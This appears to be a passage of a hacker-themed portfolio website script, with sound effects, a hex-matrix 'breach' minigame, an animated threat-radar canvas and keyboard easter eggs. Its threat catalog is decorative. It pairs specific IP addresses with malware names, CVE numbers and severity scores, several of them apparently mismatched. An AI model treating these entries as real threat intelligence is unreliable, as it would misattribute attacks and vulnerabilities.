/**
 * PWNBOX CYBER COMMAND - PLAYFUL FEATURES & SIGNATURE ENGINE
 * Features:
 * 1. Stamp Sound & Interaction (Pranav Pushya Signature Stamp)
 * 2. Authentic Cyberpunk 2077 Memory Buffer Breach Protocol (5x5 Hex Matrix)
 * 3. SOC Military-Grade Global Cyber Threat Radar & Interactive Laser Interceptor
 * 4. Keyboard Easter Eggs (Konami Code, 'hack', 'matrix', 'pranav')
 * 5. Interactive Agent Dossier & Classified ID Card Generator
 */

(function () {
    'use strict';

    // --- PROCEDURAL WEB AUDIO SYNTHESIZER ---
    let audioCtx = null;
    function getAudioContext() {
        if (!audioCtx && (window.AudioContext || window.webkitAudioContext)) {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            audioCtx = new AudioContext();
        }
        if (audioCtx && audioCtx.state === 'suspended') {
            audioCtx.resume();
        }
        return audioCtx;
    }

    function playTone(freq, type = 'sine', duration = 0.1, gainVal = 0.08) {
        try {
            const ctx = getAudioContext();
            if (!ctx) return;
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.type = type;
            osc.frequency.setValueAtTime(freq, ctx.currentTime);
            gain.gain.setValueAtTime(gainVal, ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + duration);
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
            osc.stop(ctx.currentTime + duration);
        } catch (e) {}
    }

    function playKeyClick() {
        playTone(1200, 'square', 0.03, 0.05);
        setTimeout(() => playTone(600, 'sine', 0.04, 0.03), 15);
    }

    function playClickSound() {
        playKeyClick();
    }

    function playSonarPing() {
        try {
            const ctx = getAudioContext();
            if (!ctx) return;
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.type = 'sine';
            osc.frequency.setValueAtTime(1450, ctx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(800, ctx.currentTime + 0.15);
            gain.gain.setValueAtTime(0.04, ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.15);
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
            osc.stop(ctx.currentTime + 0.15);
        } catch (e) {}
    }

    function playZapSfx() {
        try {
            const ctx = getAudioContext();
            if (!ctx) return;
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(1800, ctx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(120, ctx.currentTime + 0.12);
            gain.gain.setValueAtTime(0.12, ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.12);
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
            osc.stop(ctx.currentTime + 0.12);
        } catch (e) {}
    }

    function playStampSfx() {
        try {
            const ctx = getAudioContext();
            if (!ctx) return;
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(150, ctx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(30, ctx.currentTime + 0.18);
            gain.gain.setValueAtTime(0.2, ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.18);
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
            osc.stop(ctx.currentTime + 0.18);
            playTone(850, 'square', 0.04, 0.06);
        } catch (e) {}
    }

    function playEmpSfx() {
        try {
            const ctx = getAudioContext();
            if (!ctx) return;
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(900, ctx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(50, ctx.currentTime + 0.45);
            gain.gain.setValueAtTime(0.25, ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.45);
            osc.connect(gain);
            gain.connect(ctx.destination);
            osc.start();
            osc.stop(ctx.currentTime + 0.45);
        } catch (e) {}
    }

    function playVictorySfx() {
        setTimeout(() => playTone(523.25, 'triangle', 0.15, 0.1), 0);
        setTimeout(() => playTone(659.25, 'triangle', 0.15, 0.1), 120);
        setTimeout(() => playTone(783.99, 'triangle', 0.25, 0.12), 240);
        setTimeout(() => playTone(1046.50, 'triangle', 0.45, 0.16), 360);
    }

    function playAlarmSfx() {
        playTone(320, 'sawtooth', 0.1, 0.14);
        setTimeout(() => playTone(240, 'sawtooth', 0.18, 0.14), 100);
    }

    // --- 1. SIGNATURE STAMP INTERACTION ---
    function initStamp() {
        const stamp = document.getElementById('pranavStamp');
        if (!stamp) return;

        stamp.addEventListener('click', () => {
            playStampSfx();
            stamp.classList.remove('stamp-slam');
            void stamp.offsetWidth;
            stamp.classList.add('stamp-slam');
            triggerInkSplatter(stamp);
        });
    }

    function triggerInkSplatter(targetEl) {
        const rect = targetEl.getBoundingClientRect();
        const count = 12;
        for (let i = 0; i < count; i++) {
            const dot = document.createElement('div');
            dot.className = 'ink-drop';
            const size = Math.random() * 8 + 4;
            dot.style.width = size + 'px';
            dot.style.height = size + 'px';
            dot.style.left = (rect.left + rect.width / 2) + 'px';
            dot.style.top = (rect.top + rect.height / 2) + 'px';

            const angle = Math.random() * Math.PI * 2;
            const dist = Math.random() * 60 + 20;
            const tx = Math.cos(angle) * dist;
            const ty = Math.sin(angle) * dist;
            dot.style.setProperty('--tx', tx + 'px');
            dot.style.setProperty('--ty', ty + 'px');

            document.body.appendChild(dot);
            setTimeout(() => dot.remove(), 700);
        }
    }

    // --- 2. AUTHENTIC CYBERPUNK 2077 MEMORY BUFFER BREACH PROTOCOL ---
    const HEX_POOL = ['1C', 'E9', '7A', '55', 'BD', 'FF'];
    const MATRIX_SIZE = 5;
    const BUFFER_LIMIT = 4;
    const TOTAL_BREACH_TIME = 15.0;

    let matrixData = [];
    let targetSequence = [];
    let playerBuffer = [];
    let activeAxis = 'row'; // 'row' or 'col'
    let activeIndex = 0;
    let usedCells = new Set();
    let breachTimer = null;
    let breachTimeLeft = TOTAL_BREACH_TIME;
    let isBreachRunning = false;

    function initBreachGame() {
        const btnStart = document.getElementById('btnStartBreach');
        if (!btnStart) return;
        btnStart.addEventListener('click', startBreachProtocol);

        // Initial setup for showcase display
        generateMatrix();
        renderMatrixUI();
        renderTargetSequenceUI();
    }

    function generateMatrix() {
        matrixData = [];
        for (let r = 0; r < MATRIX_SIZE; r++) {
            const row = [];
            for (let c = 0; c < MATRIX_SIZE; c++) {
                const randHex = HEX_POOL[Math.floor(Math.random() * HEX_POOL.length)];
                row.push(randHex);
            }
            matrixData.push(row);
        }

        // Guaranteed solvable sequence path
        const r1 = 0;
        const c1 = Math.floor(Math.random() * MATRIX_SIZE);
        const code1 = matrixData[r1][c1];

        const r2 = Math.floor(Math.random() * MATRIX_SIZE);
        const code2 = matrixData[r2][c1];

        const c3 = Math.floor(Math.random() * MATRIX_SIZE);
        const code3 = matrixData[r2][c3];

        targetSequence = [code1, code2, code3];
    }

    function startBreachProtocol() {
        getAudioContext();
        if (breachTimer) clearInterval(breachTimer);

        generateMatrix();
        playerBuffer = [];
        usedCells.clear();
        activeAxis = 'row';
        activeIndex = 0;
        breachTimeLeft = TOTAL_BREACH_TIME;
        isBreachRunning = true;

        const btnStart = document.getElementById('btnStartBreach');
        const timerText = document.getElementById('breachTimerText');
        const timerBar = document.getElementById('breachTimerBar');
        const statusPill = document.getElementById('breachStatus');
        const axisGuide = document.getElementById('matrixAxisGuide');

        btnStart.disabled = true;
        btnStart.textContent = '⚡ INFILTRATING BUFFER...';
        statusPill.textContent = 'STATUS: DECRYPTING...';
        statusPill.style.color = '#00f0ff';
        if (axisGuide) {
            axisGuide.textContent = `AXIS: ROW 1 ACTIVE [HORIZONTAL]`;
            axisGuide.className = 'matrix-crosshair-status row-mode';
        }

        renderMatrixUI();
        renderTargetSequenceUI();
        updatePlayerBufferUI();
        logToTerminal('> BUFFER INITIALIZED. INJECTING ROW 0 OFFSET 0x0000...', 'info');

        playTone(480, 'square', 0.1);

        const startTime = Date.now();
        const duration = TOTAL_BREACH_TIME * 1000;

        breachTimer = setInterval(() => {
            const elapsed = Date.now() - startTime;
            breachTimeLeft = Math.max(0, (duration - elapsed) / 1000);
            timerText.textContent = breachTimeLeft.toFixed(2) + 's';
            const pct = (breachTimeLeft / TOTAL_BREACH_TIME) * 100;
            timerBar.style.width = pct + '%';

            if (breachTimeLeft <= 4.0) {
                timerBar.style.background = 'var(--bauhaus-red)';
                timerText.style.color = 'var(--bauhaus-red)';
            } else {
                timerBar.style.background = 'var(--bauhaus-yellow)';
                timerText.style.color = '#f1f5f9';
            }

            if (breachTimeLeft <= 0) {
                endBreachProtocol(false, 'TIME EXPIRED // INTRUSION DETECTED & TRACED');
            }
        }, 30);
    }

    function renderMatrixUI() {
        const grid = document.getElementById('breachMatrixGrid');
        if (!grid) return;
        grid.innerHTML = '';

        for (let r = 0; r < MATRIX_SIZE; r++) {
            for (let c = 0; c < MATRIX_SIZE; c++) {
                const cell = document.createElement('button');
                const cellKey = `${r},${c}`;
                const isUsed = usedCells.has(cellKey);
                const isActiveAxis = isBreachRunning && ((activeAxis === 'row' && r === activeIndex) || (activeAxis === 'col' && c === activeIndex));

                cell.className = 'matrix-cell';
                if (isUsed) {
                    cell.classList.add('used');
                    cell.textContent = '[--]';
                } else {
                    cell.textContent = matrixData[r][c];
                    if (isActiveAxis) cell.classList.add('active-axis');
                }

                cell.setAttribute('data-row', r);
                cell.setAttribute('data-col', c);

                cell.addEventListener('click', () => handleCellClick(r, c));
                grid.appendChild(cell);
            }
        }
    }

    function handleCellClick(r, c) {
        if (!isBreachRunning) return;
        const cellKey = `${r},${c}`;
        if (usedCells.has(cellKey)) return;

        // Check if on active axis
        if ((activeAxis === 'row' && r !== activeIndex) || (activeAxis === 'col' && c !== activeIndex)) {
            playTone(160, 'sawtooth', 0.1);
            logToTerminal(`> INVALID AXIS: PLEASE SELECT FROM HIGHLIGHTED ${activeAxis.toUpperCase()}`, 'warn');
            return;
        }

        // Valid move!
        playKeyClick();
        const code = matrixData[r][c];
        playerBuffer.push(code);
        usedCells.add(cellKey);

        logToTerminal(`> MEMORY INJECTION: [ 0x${code} ] AT [R${r}:C${c}]`, 'success');

        // Switch axis
        if (activeAxis === 'row') {
            activeAxis = 'col';
            activeIndex = c;
        } else {
            activeAxis = 'row';
            activeIndex = r;
        }

        const axisGuide = document.getElementById('matrixAxisGuide');
        if (axisGuide) {
            axisGuide.textContent = `AXIS: ${activeAxis === 'row' ? 'ROW ' + (activeIndex + 1) + ' [HORIZONTAL]' : 'COLUMN ' + (activeIndex + 1) + ' [VERTICAL]'}`;
            axisGuide.className = `matrix-crosshair-status ${activeAxis}-mode`;
        }

        renderMatrixUI();
        updatePlayerBufferUI();

        // Check win condition
        if (checkSequenceMatch()) {
            endBreachProtocol(true, 'KERNEL COMPROMISED // ROOT SHELL ACQUIRED!');
            return;
        }

        // Check loss by buffer overflow
        if (playerBuffer.length >= BUFFER_LIMIT) {
            endBreachProtocol(false, 'BUFFER OVERFLOW // SEQUENCE INTEGRITY CORRUPTED');
        }
    }

    function checkSequenceMatch() {
        if (playerBuffer.length < targetSequence.length) return false;
        for (let i = 0; i <= playerBuffer.length - targetSequence.length; i++) {
            let match = true;
            for (let j = 0; j < targetSequence.length; j++) {
                if (playerBuffer[i + j] !== targetSequence[j]) {
                    match = false;
                    break;
                }
            }
            if (match) return true;
        }
        return false;
    }

    function updatePlayerBufferUI() {
        const container = document.getElementById('breachUserBuffer');
        const slotsCount = document.getElementById('bufferSlotsUsed');
        if (!container) return;

        if (slotsCount) slotsCount.textContent = playerBuffer.length.toString();

        container.innerHTML = '';
        for (let i = 0; i < BUFFER_LIMIT; i++) {
            const slot = document.createElement('span');
            slot.className = 'buf-slot';
            if (i < playerBuffer.length) {
                slot.textContent = playerBuffer[i];
                slot.classList.add('filled');
            } else {
                slot.textContent = '_';
                slot.classList.add('empty');
            }
            container.appendChild(slot);
        }
    }

    function renderTargetSequenceUI() {
        const seqContainer = document.getElementById('breachTargetSequence');
        if (!seqContainer) return;
        seqContainer.innerHTML = '';
        targetSequence.forEach(code => {
            const chip = document.createElement('span');
            chip.className = 'seq-chip';
            chip.textContent = code;
            seqContainer.appendChild(chip);
        });
    }

    function logToTerminal(msg, type = 'info') {
        const logBox = document.getElementById('breachTerminalLog');
        if (!logBox) return;
        const line = document.createElement('div');
        line.className = `term-line ${type}`;
        line.textContent = msg;
        logBox.appendChild(line);
        logBox.scrollTop = logBox.scrollHeight;

        while (logBox.children.length > 7) {
            logBox.removeChild(logBox.firstChild);
        }
    }

    function endBreachProtocol(won, reason) {
        clearInterval(breachTimer);
        isBreachRunning = false;

        const btnStart = document.getElementById('btnStartBreach');
        const statusPill = document.getElementById('breachStatus');
        const timerText = document.getElementById('breachTimerText');
        const timerBar = document.getElementById('breachTimerBar');

        btnStart.disabled = false;
        btnStart.textContent = won ? '⚡ RE-ENGAGE PROTOCOL' : '⚡ RETRY BREACH';

        if (won) {
            playVictorySfx();
            statusPill.textContent = 'STATUS: ACCESS GRANTED';
            statusPill.style.color = '#10b981';
            timerText.textContent = 'UNLOCKED';
            timerText.style.color = '#10b981';
            timerBar.style.width = '100%';
            timerBar.style.background = '#10b981';
            logToTerminal(`> [CRITICAL SUCCESS] ${reason}`, 'success');
            logToTerminal(`> ARCHITECT ROOT ACCREDITED: PRANAV PUSHYA`, 'success');

            if (breachTimeLeft >= 7.0 || playerBuffer.includes('FF')) {
                logToTerminal(`> [OVERCLOCK CIPHER DETECTED] LAUNCHING ARCHITECT GODMODE...`, 'info');
                setTimeout(() => {
                    if (typeof openGodModeModal === 'function') openGodModeModal();
                }, 1000);
            }

            if (window.triggerHeroConfetti) {
                window.triggerHeroConfetti();
            }
        } else {
            playAlarmSfx();
            statusPill.textContent = 'STATUS: LOCKOUT';
            statusPill.style.color = 'var(--bauhaus-red)';
            timerText.textContent = 'FAILED';
            timerText.style.color = 'var(--bauhaus-red)';
            timerBar.style.width = '0%';
            logToTerminal(`> [FATAL EXCEPTION] ${reason}`, 'warn');
        }
    }

    // --- 3. SOC MILITARY-GRADE GLOBAL THREAT RADAR ---
    let radarCanvas = null;
    let radarCtx = null;
    let radarAngle = 0;
    let threats = [];
    let radarSonarEnabled = false;
    let activeFilter = 'all';
    let hoveredThreat = null;
    let laserBeamEffect = null;
    let shockwaveEffect = null;

    const SOC_THREAT_CATALOG = [
        { type: 'Cobalt Strike C2 Beacon', category: 'c2', ip: '185.220.101.5', sector: 'Frankfurt (DE)', port: '443/TLS', bandwidth: '42.4 Gbps', cvss: '9.8 CRITICAL', cve: 'CVE-2023-3824' },
        { type: 'Mirai Botnet SYN Flood', category: 'c2', ip: '45.155.205.23', sector: 'Ashburn (US)', port: '80/TCP', bandwidth: '128 Kpps', cvss: '8.6 HIGH', cve: 'CVE-2023-44487' },
        { type: 'Zero-Day Remote Code Exec', category: 'cve', ip: '91.240.118.2', sector: 'Tokyo (JP)', port: '8080/HTTP', bandwidth: '8.2 Gbps', cvss: '10.0 CRITICAL', cve: 'CVE-2024-38812' },
        { type: 'Kerberoasting Ticket Injection', category: 'cve', ip: '103.145.13.9', sector: 'Singapore (SG)', port: '88/KRB', bandwidth: 'Lateral Move', cvss: '9.1 CRITICAL', cve: 'CVE-2020-1472' },
        { type: 'DNS Tunneling Data Exfil', category: 'c2', ip: '198.51.100.4', sector: 'London (UK)', port: '53/UDP', bandwidth: 'High Entropy', cvss: '8.4 HIGH', cve: 'DNS-EXFIL-A2' },
        { type: 'BlackCat Ransomware Probe', category: 'cve', ip: '194.26.29.11', sector: 'São Paulo (BR)', port: '445/SMB', bandwidth: '445 Probe', cvss: '9.8 CRITICAL', cve: 'CVE-2021-4034' },
        { type: 'ShadowBroker SMB Exploit', category: 'cve', ip: '193.106.191.7', sector: 'Zurich (CH)', port: '139/NETBIOS', bandwidth: 'EternalBlue', cvss: '9.9 CRITICAL', cve: 'MS17-010' },
        { type: 'Mozi IoT Worm Propagation', category: 'c2', ip: '210.140.10.88', sector: 'Seoul (KR)', port: '23/TELNET', bandwidth: '34.1 Kpps', cvss: '8.9 HIGH', cve: 'CVE-2021-35394' }
    ];

    function initRadar() {
        radarCanvas = document.getElementById('threatRadarCanvas');
        if (!radarCanvas) return;
        radarCtx = radarCanvas.getContext('2d');

        resizeRadar();
        window.addEventListener('resize', resizeRadar);

        // Spawn initial 5 threats
        for (let i = 0; i < 5; i++) spawnThreat();

        setInterval(() => {
            if (threats.length < 8) spawnThreat();
        }, 2400);

        renderRadar();

        // Canvas mouse interaction (Hover & Click Interception)
        radarCanvas.addEventListener('mousemove', handleRadarMouseMove);
        radarCanvas.addEventListener('mouseleave', () => { hoveredThreat = null; });
        radarCanvas.addEventListener('click', handleRadarClick);

        // Controls
        const btnEmp = document.getElementById('btnFireEmp');
        if (btnEmp) btnEmp.addEventListener('click', fireEmpCountermeasure);

        const btnSonar = document.getElementById('btnRadarSonar');
        if (btnSonar) {
            btnSonar.addEventListener('click', () => {
                radarSonarEnabled = !radarSonarEnabled;
                btnSonar.classList.toggle('active', radarSonarEnabled);
                btnSonar.textContent = radarSonarEnabled ? '🔊 SONAR: ON' : '🔇 SONAR: OFF';
                if (radarSonarEnabled) playSonarPing();
            });
        }

        // Filter buttons
        document.querySelectorAll('.radar-mode-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.radar-mode-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                activeFilter = btn.getAttribute('data-filter') || 'all';
                playKeyClick();
            });
        });
    }

    function resizeRadar() {
        if (!radarCanvas) return;
        const box = radarCanvas.parentElement.getBoundingClientRect();
        const dim = Math.min(box.width, 360);
        radarCanvas.width = dim;
        radarCanvas.height = dim;
    }

    function spawnThreat() {
        const radius = Math.random() * 0.65 + 0.2;
        const angle = Math.random() * Math.PI * 2;
        const meta = SOC_THREAT_CATALOG[Math.floor(Math.random() * SOC_THREAT_CATALOG.length)];

        threats.push({
            id: Math.random().toString(36).substr(2, 9),
            r: radius,
            angle: angle,
            alpha: 1.0,
            meta: meta,
            pingPulse: 0,
            hasPinged: false,
            time: Date.now()
        });

        appendTicker(meta);
    }

    function appendTicker(meta) {
        const ticker = document.getElementById('radarTickerLogs');
        if (!ticker) return;

        const timeStr = new Date().toTimeString().split(' ')[0];
        const row = document.createElement('div');
        row.className = 'ticker-log-item';
        row.innerHTML = `<span class="ticker-time">[${timeStr}]</span> <span class="ticker-status">[DETECTED]</span> <span class="ticker-type">${meta.type}</span> &rarr; <span class="ticker-ip">${meta.ip}</span> (${meta.sector})`;
        ticker.prepend(row);

        while (ticker.children.length > 5) {
            ticker.removeChild(ticker.lastChild);
        }
    }

    function handleRadarMouseMove(e) {
        const rect = radarCanvas.getBoundingClientRect();
        const mx = e.clientX - rect.left;
        const my = e.clientY - rect.top;
        const cx = radarCanvas.width / 2;
        const cy = radarCanvas.height / 2;
        const maxR = radarCanvas.width / 2 - 14;

        let closest = null;
        let minDist = 22;

        threats.forEach(t => {
            if (activeFilter !== 'all' && t.meta.category !== activeFilter) return;
            const tx = cx + Math.cos(t.angle) * (t.r * maxR);
            const ty = cy + Math.sin(t.angle) * (t.r * maxR);
            const d = Math.hypot(mx - tx, my - ty);
            if (d < minDist) {
                minDist = d;
                closest = t;
            }
        });

        hoveredThreat = closest;
        updateLockonCard(closest);
    }

    function updateLockonCard(threat) {
        const card = document.getElementById('radarLockonCard');
        const ipEl = document.getElementById('lockonIp');
        const detailsEl = document.getElementById('lockonDetails');
        if (!card || !ipEl || !detailsEl) return;

        if (threat) {
            card.classList.add('visible');
            ipEl.textContent = `TARGET: ${threat.meta.ip} [${threat.meta.cvss}]`;
            detailsEl.textContent = `SECTOR: ${threat.meta.sector} // PORT: ${threat.meta.port} // VECTOR: ${threat.meta.type}`;
        } else {
            card.classList.remove('visible');
        }
    }

    function handleRadarClick() {
        if (!hoveredThreat) return;
        const t = hoveredThreat;

        // Laser beam animation from center
        const cx = radarCanvas.width / 2;
        const cy = radarCanvas.height / 2;
        const maxR = radarCanvas.width / 2 - 14;
        const tx = cx + Math.cos(t.angle) * (t.r * maxR);
        const ty = cy + Math.sin(t.angle) * (t.r * maxR);

        laserBeamEffect = { x1: cx, y1: cy, x2: tx, y2: ty, alpha: 1.0 };
        playZapSfx();

        // Increment score
        const scoreEl = document.getElementById('threatInterceptCount');
        if (scoreEl) {
            scoreEl.textContent = ((parseInt(scoreEl.textContent, 10) || 0) + 1).toString();
        }

        // Remove threat
        threats = threats.filter(item => item !== t);
        hoveredThreat = null;
        updateLockonCard(null);

        // Ticker update
        const ticker = document.getElementById('radarTickerLogs');
        if (ticker) {
            const timeStr = new Date().toTimeString().split(' ')[0];
            const row = document.createElement('div');
            row.className = 'ticker-log-item';
            row.innerHTML = `<span class="ticker-time">[${timeStr}]</span> <span class="ticker-status" style="color: #00f0ff;">[DEFLECTED]</span> <span class="ticker-type">TACTICAL COUNTERMEASURE</span> &rarr; ${t.meta.ip} NEUTRALIZED`;
            ticker.prepend(row);
        }
    }

    function renderRadar() {
        if (!radarCanvas || !radarCtx) return;
        const w = radarCanvas.width;
        const h = radarCanvas.height;
        const cx = w / 2;
        const cy = h / 2;
        const maxR = w / 2 - 14;

        radarCtx.clearRect(0, 0, w, h);

        // 1. Polar Scope Background
        radarCtx.fillStyle = '#060a12';
        radarCtx.beginPath();
        radarCtx.arc(cx, cy, maxR, 0, Math.PI * 2);
        radarCtx.fill();

        // 2. Tactical Concentric Distance Range Rings
        const rangeDistances = ['2,500 KM', '5,000 KM', '7,500 KM', '10,000 KM'];
        [0.25, 0.5, 0.75, 1.0].forEach((f, idx) => {
            const r = maxR * f;
            radarCtx.strokeStyle = 'rgba(0, 240, 255, 0.22)';
            radarCtx.lineWidth = 1;
            radarCtx.beginPath();
            radarCtx.arc(cx, cy, r, 0, Math.PI * 2);
            radarCtx.stroke();

            // Distance labels
            radarCtx.fillStyle = 'rgba(0, 240, 255, 0.45)';
            radarCtx.font = '8px monospace';
            radarCtx.fillText(rangeDistances[idx], cx + 4, cy - r + 10);
        });

        // 3. Azimuth Degree Crosshairs & Compass Ticks
        radarCtx.strokeStyle = 'rgba(0, 240, 255, 0.25)';
        radarCtx.lineWidth = 1;
        radarCtx.beginPath();
        radarCtx.moveTo(cx, cy - maxR);
        radarCtx.lineTo(cx, cy + maxR);
        radarCtx.moveTo(cx - maxR, cy);
        radarCtx.lineTo(cx + maxR, cy);
        radarCtx.stroke();

        // Cardinal Ticks
        const cardinals = [
            { text: '000° N', x: cx, y: cy - maxR + 9 },
            { text: '090° E', x: cx + maxR - 22, y: cy + 3 },
            { text: '180° S', x: cx, y: cy + maxR - 3 },
            { text: '270° W', x: cx - maxR + 5, y: cy + 3 }
        ];
        radarCtx.fillStyle = '#38bdf8';
        radarCtx.font = '9px monospace';
        radarCtx.textAlign = 'center';
        cardinals.forEach(c => radarCtx.fillText(c.text, c.x, c.y));

        // 4. Rotating Tactical Phosphor Sweep Trail
        radarAngle += 0.032;
        const trailArc = 0.65;
        const sweepGrad = radarCtx.createRadialGradient(cx, cy, 0, cx, cy, maxR);
        sweepGrad.addColorStop(0, 'rgba(0, 255, 170, 0.22)');
        sweepGrad.addColorStop(1, 'rgba(0, 255, 170, 0.0)');

        radarCtx.save();
        radarCtx.beginPath();
        radarCtx.moveTo(cx, cy);
        radarCtx.arc(cx, cy, maxR, radarAngle - trailArc, radarAngle);
        radarCtx.closePath();
        radarCtx.fillStyle = sweepGrad;
        radarCtx.fill();
        radarCtx.restore();

        // Sweep Leading Line
        radarCtx.strokeStyle = '#00ffaa';
        radarCtx.lineWidth = 2;
        radarCtx.beginPath();
        radarCtx.moveTo(cx, cy);
        radarCtx.lineTo(cx + Math.cos(radarAngle) * maxR, cy + Math.sin(radarAngle) * maxR);
        radarCtx.stroke();

        // 5. Render Threat Blips & Tactical Lock Reticles
        const currentSweepNorm = ((radarAngle % (Math.PI * 2)) + Math.PI * 2) % (Math.PI * 2);

        threats.forEach(t => {
            if (activeFilter !== 'all' && t.meta.category !== activeFilter) return;

            const tx = cx + Math.cos(t.angle) * (t.r * maxR);
            const ty = cy + Math.sin(t.angle) * (t.r * maxR);

            // Sweep hit detection
            const threatNorm = ((t.angle % (Math.PI * 2)) + Math.PI * 2) % (Math.PI * 2);
            const angleDiff = Math.abs(currentSweepNorm - threatNorm);
            if (angleDiff < 0.06 && !t.hasPinged) {
                t.pingPulse = 1.0;
                t.hasPinged = true;
                if (radarSonarEnabled) playSonarPing();
            } else if (angleDiff > 0.4) {
                t.hasPinged = false;
            }

            // Expanding Sonar Ping Ring
            if (t.pingPulse > 0.01) {
                radarCtx.strokeStyle = `rgba(0, 255, 170, ${t.pingPulse})`;
                radarCtx.lineWidth = 1.5;
                radarCtx.beginPath();
                radarCtx.arc(tx, ty, 6 + (1.0 - t.pingPulse) * 18, 0, Math.PI * 2);
                radarCtx.stroke();
                t.pingPulse -= 0.04;
            }

            // Blip Color by Category
            const blipColor = t.meta.category === 'c2' ? '#f97316' : '#d9291c';

            // Solid Core
            radarCtx.fillStyle = blipColor;
            radarCtx.beginPath();
            radarCtx.arc(tx, ty, 4, 0, Math.PI * 2);
            radarCtx.fill();

            // Threat Diamond / Reticle
            radarCtx.strokeStyle = blipColor;
            radarCtx.lineWidth = 1.2;
            radarCtx.strokeRect(tx - 6, ty - 6, 12, 12);

            // If hovered, draw targeting lock lines
            if (hoveredThreat === t) {
                radarCtx.strokeStyle = '#00f0ff';
                radarCtx.lineWidth = 1.5;
                radarCtx.beginPath();
                radarCtx.moveTo(cx, cy);
                radarCtx.lineTo(tx, ty);
                radarCtx.stroke();

                radarCtx.strokeStyle = '#00f0ff';
                radarCtx.strokeRect(tx - 10, ty - 10, 20, 20);
            }
        });

        // 6. Laser Countermeasure Beam Render
        if (laserBeamEffect && laserBeamEffect.alpha > 0.02) {
            radarCtx.save();
            radarCtx.strokeStyle = `rgba(0, 240, 255, ${laserBeamEffect.alpha})`;
            radarCtx.lineWidth = 3;
            radarCtx.shadowColor = '#00f0ff';
            radarCtx.shadowBlur = 10;
            radarCtx.beginPath();
            radarCtx.moveTo(laserBeamEffect.x1, laserBeamEffect.y1);
            radarCtx.lineTo(laserBeamEffect.x2, laserBeamEffect.y2);
            radarCtx.stroke();
            radarCtx.restore();
            laserBeamEffect.alpha -= 0.12;
        }

        // 7. EMP Expanding Shockwave Render
        if (shockwaveEffect && shockwaveEffect.r < maxR) {
            radarCtx.save();
            radarCtx.strokeStyle = `rgba(0, 240, 255, ${shockwaveEffect.alpha})`;
            radarCtx.lineWidth = 4;
            radarCtx.beginPath();
            radarCtx.arc(cx, cy, shockwaveEffect.r, 0, Math.PI * 2);
            radarCtx.stroke();
            radarCtx.restore();

            shockwaveEffect.r += 10;
            shockwaveEffect.alpha -= 0.03;
            if (shockwaveEffect.r >= maxR) shockwaveEffect = null;
        }

        requestAnimationFrame(renderRadar);
    }

    function fireEmpCountermeasure() {
        playEmpSfx();
        const maxR = radarCanvas ? radarCanvas.width / 2 - 14 : 150;
        shockwaveEffect = { r: 10, alpha: 1.0 };

        const deflectedCount = threats.length;
        threats = []; // Wipe all threats
        hoveredThreat = null;
        updateLockonCard(null);

        const scoreEl = document.getElementById('threatInterceptCount');
        if (scoreEl) {
            const current = parseInt(scoreEl.textContent, 10) || 0;
            scoreEl.textContent = (current + Math.max(8, deflectedCount)).toString();
        }

        const flash = document.getElementById('radarFlashOverlay');
        if (flash) {
            flash.classList.remove('emp-active');
            void flash.offsetWidth;
            flash.classList.add('emp-active');
        }

        appendTicker({
            type: 'EMP COUNTERMEASURE OVERLOAD',
            ip: 'SOC-DEFENSE-GRID',
            sector: 'GLOBAL RADAR',
            port: 'ALL CHANNELS',
            status: 'NEUTRALIZED'
        });
    }

    // --- 4. KEYBOARD EASTER EGGS ---
    const konamiSequence = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
    let konamiIndex = 0;
    let konamiTimeout = null;
    let typedBuffer = '';
    let wordEasterEggTimeout = null;
    const secretEasterWords = ['hack', 'matrix', 'pranav'];

    function initEasterEggs() {
        // Use capture phase so Konami code & secret word keystrokes are intercepted BEFORE any single-key navigation
        window.addEventListener('keydown', (e) => {
            const activeEl = document.activeElement;
            const activeTag = activeEl ? activeEl.tagName : '';
            const isEditable = activeEl ? (activeEl.isContentEditable || activeEl.getAttribute('contenteditable') === 'true') : false;
            if (activeTag === 'INPUT' || activeTag === 'TEXTAREA' || activeTag === 'SELECT' || isEditable) return;

            const key = e.key.length === 1 ? e.key.toLowerCase() : e.key;

            // 1. Konami Code Sequence Matching
            if (key === konamiSequence[konamiIndex] || e.key === konamiSequence[konamiIndex]) {
                konamiIndex++;
                window.__pwnboxKonamiActive = true;
                clearTimeout(konamiTimeout);
                konamiTimeout = setTimeout(() => {
                    konamiIndex = 0;
                    window.__pwnboxKonamiActive = false;
                }, 3000);

                // When typing 'b' or 'a' in the sequence, strictly intercept and stop propagation so it never redirects to assistant!
                if (key === 'b' || key === 'a' || konamiIndex === konamiSequence.length) {
                    e.preventDefault();
                    e.stopPropagation();
                    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
                }

                if (konamiIndex === konamiSequence.length) {
                    konamiIndex = 0;
                    clearTimeout(konamiTimeout);
                    setTimeout(() => { window.__pwnboxKonamiActive = false; }, 600);
                    triggerSecretArchitectModal('KONAMI CODE DETECTED: GODMODE ACTIVE');
                    return;
                }
            } else if (key === konamiSequence[0] || e.key === konamiSequence[0]) {
                konamiIndex = 1;
                window.__pwnboxKonamiActive = true;
